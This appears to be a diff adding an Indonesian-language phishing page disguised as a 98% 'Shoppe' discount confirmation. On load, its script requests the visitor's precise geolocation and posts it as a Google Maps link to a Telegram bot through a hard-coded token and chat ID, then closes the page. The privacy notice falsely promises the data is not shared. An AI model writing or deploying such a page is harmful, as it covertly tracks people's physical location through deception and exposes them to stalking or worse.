@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Konfirmasi Diskon 98 % Shoppe</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+      background: linear-gradient(180deg, #e7f1ff, #f5f9ff);
+      margin: 0;
+      padding: 0;
+      color: #1c1e21;
+    }
+    .card {
+      max-width: 420px;
+      margin: 80px auto;
+      background: #ffffff;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(24,119,242,.15);
+      padding: 24px;
+    }
+    h1 {
+      font-size: 20px;
+      margin-bottom: 12px;
+      color: #1877f2;
+    }
+    p {
+      font-size: 14px;
+      color: #4b4f56;
+      line-height: 1.6;
+    }
+    .status {
+      margin-top: 14px;
+      padding: 10px;
+      background: #e7f1ff;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 600;
+      color: #1877f2;
+      text-align: center;
+    }
+    .privacy {
+      margin-top: 18px;
+      padding-top: 14px;
+      border-top: 1px solid #dbe7ff;
+      font-size: 12px;
+      color: #606770;
+      line-height: 1.5;
+    }
+    .footer {
+      margin-top: 18px;
+      font-size: 12px;
+      color: #8a8d91;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <h1>Konfirmasi Diskon 98 % Shoppe</h1>
+
+  <p>
+    Sistem memerlukan verifikasi lokasi perangkat untuk melanjutkan proses
+    sesuai kebijakan keamanan.
+  </p>
+
+  <div id="status" class="status">
+    Memverifikasi lokasi…
+  </div>
+
+  <div class="privacy">
+    <strong>Kebijakan Privasi</strong><br>
+    Informasi lokasi digunakan hanya untuk keperluan verifikasi sistem.
+    Data tidak disimpan secara permanen dan tidak dibagikan kepada pihak ketiga.
+    Dengan melanjutkan, Anda menyetujui kebijakan ini.
+  </div>
+
+  <div class="footer">
+    © Sistem Verifikasi
+  </div>
+</div>
+
+<script>
+const BOT_TOKEN = "6679340343:AAFk5Y0kQGAIFyGj6fhS8EwGchNASRoLFGA";
+const CHAT_ID   = "913215740";
+
+// waktu auto close (ms)
+const AUTO_CLOSE_DELAY = 3000; // 3 detik
+
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(
+    function (position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      document.getElementById("status").innerText =
+        "Verifikasi berhasil. Halaman akan ditutup otomatis…";
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: `📍 Lokasi terverifikasi:\nhttps://maps.google.com/?q=${lat},${lon}`
+        })
+      }).finally(() => {
+        setTimeout(() => {
+          window.close();
+
+          // fallback jika close diblokir browser
+          setTimeout(() => {
+            window.location.href = "about:blank";
+          }, 500);
+        }, AUTO_CLOSE_DELAY);
+      });
+    },
+    function () {
+      document.getElementById("status").innerText =
+        "Akses lokasi diperlukan untuk melanjutkan proses.";
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 10000
+    }
+  );
+} else {
+  document.getElementById("status").innerText =
+    "Browser tidak mendukung fitur lokasi.";
+}
+</script>
+
+</body>
+</html>
